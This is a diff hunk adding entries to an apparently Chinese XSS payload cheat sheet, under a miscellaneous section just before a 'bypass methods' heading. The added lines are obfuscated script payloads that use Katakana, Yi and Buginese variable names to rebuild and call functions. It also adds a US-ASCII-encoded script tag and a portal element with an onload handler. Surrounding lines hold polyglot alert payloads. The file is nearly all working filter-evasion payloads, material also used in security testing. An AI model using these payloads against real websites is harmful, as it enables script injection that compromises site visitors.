@@ -164,6 +164,16 @@ background属性
 杂项
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
 <math><a xlink:href="//baidu.com">click
+
+<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
+
+<script>ꆇ='',ꉄ=!ꆇ+ꆇ,ꉦ=!ꉄ+ꆇ,ꊗ=ꆇ+{},ꀻ=ꉄ[ꆇ++],ꃋ=ꉄ[ꆚ=ꆇ],ꋕ=++ꆚ+ꆇ,ꐍ=ꊗ[ꆚ+ꋕ],ꉄ[ꐍ+=ꊗ[ꆇ]+(ꉄ.ꉦ+ꊗ)[ꆇ]+ꉦ[ꋕ]+ꀻ+ꃋ+ꉄ[ꆚ]+ꐍ+ꀻ+ꊗ[ꆇ]+ꃋ][ꐍ](ꉦ[ꆇ]+ꉦ[ꆚ]+ꉄ[ꋕ]+ꃋ+ꀻ+"(ꆇ)")()</script>
+
+<script>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()</script>
+
+¼script¾alert(¢XSS¢)¼/script¾
+
+<portal id="q" src="bing.com" onload="print(q.activate())"></portal>
 ```
 
 ## 绕过方法
